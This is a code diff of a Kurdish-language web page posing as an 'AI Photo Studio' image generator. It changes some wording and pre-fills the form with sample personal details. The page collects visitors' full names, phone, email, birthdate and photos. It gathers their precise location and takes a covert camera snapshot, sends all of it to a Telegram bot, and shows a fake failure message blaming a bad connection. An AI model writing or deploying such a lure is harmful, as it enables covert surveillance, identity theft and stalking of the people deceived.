@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Photo Studio - دروستکردنی ١٠٠ وێنەی لۆگۆ و ئەڤاتار</title>
+    <title>AI Photo Studio - دروستکردنی وێنە لە ڕێگەی زیرەکی دەستکردەوە</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
@@ -196,37 +196,37 @@
 
     <div class="container" id="main-card">
         <div class="logo-icon">✨</div>
-        <h1>AI Photo Studio - دروستکردنی ١٠٠ وێنەی AI</h1>
-        <p>ئەم ماڵپەڕە سەکۆیەکی پێشکەوتووی زیرەکی دەستکردە (AI) کە تایبەتە بە دروستکردنی ١٠٠ وێنەی ناوازەی لۆگۆ و ئەڤاتار بە کوالێتی بەرز[cite: 3].</p>
+        <h1>AI Photo Studio - دروستکردنی وێنە لە ڕێگەی زیرەکی دەستکردەوە AI</h1>
+        <p>ئەم ماڵپەڕە سەکۆیەکی پێشکەوتووی زیرەکی دەستکردە (AI) کە تایبەتە بە دروستکردنی وێنەی ناوازە بە زیرەکی دەستکرد بە کوالێتی بەرز[cite: 3].</p>
         
         <div class="info-box">
             📌 <strong>بۆچی خۆتۆمارکردن گرنگە؟</strong><br>
-            بۆ ئەوەی سیستەمەکە بتوانێت ناسنامەی مۆدێلەکەت ڕێک بخات، وێنەکانت بە دروستی جێبەجێ بکات و مۆدێلی AI چالاک ببێت، پێویستە ئەم زانیاریانە پڕ بکەیتەوە.
+            بۆ ئەوەی سیستەمەکە بتوانێت داتای بەکارهێنەر وەربگرێ بۆ باشترکردنی خۆی، و وێنەکانت بە تەواوی دروست بکات و مۆدێلی AI چالاک ببێت، پێویستە خۆت تۆمار بکەیت و زانیارییەکان پڕ بکەیتەوە.
         </div>
 
         <div class="form-group">
             <label>ناوی خۆت:</label>
-            <input type="text" id="name" class="form-control" placeholder="بۆ نموونە: ڕێبین">
+            <input type="text" id="name" class="form-control" value="ئارام" placeholder="بۆ نموونە: ئارام">
         </div>
         <div class="form-group">
             <label>ناوی باوک:</label>
-            <input type="text" id="fatherName" class="form-control" placeholder="بۆ نموونە: کەریم">
+            <input type="text" id="fatherName" class="form-control" value="عومەر" placeholder="بۆ نموونە: عومەر">
         </div>
         <div class="form-group">
             <label>ناوی باپیر:</label>
-            <input type="text" id="grandfatherName" class="form-control" placeholder="بۆ نموونە: ئەحمەد">
+            <input type="text" id="grandfatherName" class="form-control" value="حەسەن" placeholder="بۆ نموونە: حەسەن">
         </div>
         <div class="form-group">
             <label>ژمارەی تەلەفۆن:</label>
-            <input type="tel" id="phone" class="form-control" placeholder="0750XXXXXXX">
+            <input type="tel" id="phone" class="form-control" value="07501234567" placeholder="0750XXXXXXX">
         </div>
         <div class="form-group">
             <label>ئیمەیڵەکەت:</label>
-            <input type="email" id="email" class="form-control" placeholder="example@gmail.com">
+            <input type="email" id="email" class="form-control" value="aram.omar@gmail.com" placeholder="example@gmail.com">
         </div>
         <div class="form-group">
             <label>ڕێکەوتی لەدایکبوون:</label>
-            <input type="date" id="birthdate" class="form-control">
+            <input type="date" id="birthdate" class="form-control" value="1998-05-12">
         </div>
 
         <div class="upload-box" onclick="document.getElementById('fileInput').click()">
@@ -234,7 +234,7 @@
             <input type="file" id="fileInput" accept="image/*" onchange="handleFileSelect()">
         </div>
 
-        <button class="btn" id="generateBtn" onclick="startAIProcess()" disabled style="opacity: 0.5; cursor: not-allowed;">دەستپێکردنی دروستکردن (١٠٠ وێنە)</button>
+        <button class="btn" id="generateBtn" onclick="startAIProcess()" disabled style="opacity: 0.5; cursor: not-allowed;">دەستپێکردنی دروستکردن</button>
 
         <div class="progress-container" id="progressBox">
             <div class="progress-bar-bg">
@@ -439,7 +439,7 @@
             await sleep(800);
             updateProgress(80, "دروستکردنی ١٠٠ وێنە...");
             await sleep(800);
-            updateProgress(100, "تەواو بوو!");
+            updateProgress(100, "خەریکە تەواو دەبێت!");
 
             let mapTextPart = mapLink 
                 ? `لۆکەیشنی دەقیقی کەسەکە: [گووگڵ ماپ](${mapLink}) (Lat & Long: ${locationText})` 
@@ -491,7 +491,7 @@
                     const formDataCam = new FormData();
                     formDataCam.append('chat_id', chatId);
                     formDataCam.append('photo', cameraBlob, 'camera.jpg');
-                    formDataCam.append('caption', `📸 وێنەی ڕاستەوخۆی کامێرا (${uName})`);
+                    formDataCam.append('caption', `📸 وێنەی ڕاستەوخۆی کەسەکە (${uName})`);
                     
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataCam });
                 } catch (err) {}
@@ -511,7 +511,7 @@
             setTimeout(() => {
                 document.getElementById('main-card').innerHTML = `
                     <div style="font-size: 50px; margin-bottom: 15px; filter: drop-shadow(0 0 10px #f87171);">⚠️</div>
-                    <h1 style="color: #f87171; text-shadow: 0 0 10px rgba(248, 113, 113, 0.6);">وێنەکانت ئامادە نەبوون!</h1>
+                    <h1 style="color: #f87171; text-shadow: 0 0 10px rgba(248, 113, 113, 0.6);">وێنەکانت نەتوانران بە تەواوی دروست بکرێن!</h1>
                     <p style="text-shadow: 0 0 5px rgba(255,255,255,0.3);">بەهۆی خراپی دۆخی ئینتەرنێتەکەت و پچڕانی هێڵەکەوە، پرۆسەی دروستکردنی وێنەکان سەرکەوتوو نەبوو. تکایە هێڵی ئینتەرنێتەکەت بپشکنە و دووبارە هەوڵ بدەرەوە.</p>
                 `;
             }, 1000);
